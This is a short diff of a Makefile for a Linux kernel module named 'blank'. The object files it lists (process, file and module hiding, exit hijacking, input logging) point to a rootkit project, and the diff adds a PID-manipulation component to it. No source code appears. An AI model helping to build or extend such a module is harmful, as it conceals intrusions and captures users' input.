@@ -12,7 +12,7 @@
 
 moduleName = blank
 obj-m += $(moduleName).o
-blank-objs += processHider.o main.o fileHide.o moduleHide.o doExitHijack.o logInput.o common.o outputDevice.o buffer/buffer.o 
+blank-objs += doExitHijack.o processHider.o proccessHiderPidManipluation.o main.o fileHide.o moduleHide.o logInput.o common.o outputDevice.o buffer/buffer.o 
 
 #TODO: fix location buffer is build - Ensure "buffer/makefile"  does not generate a conflicting ".o" file
 
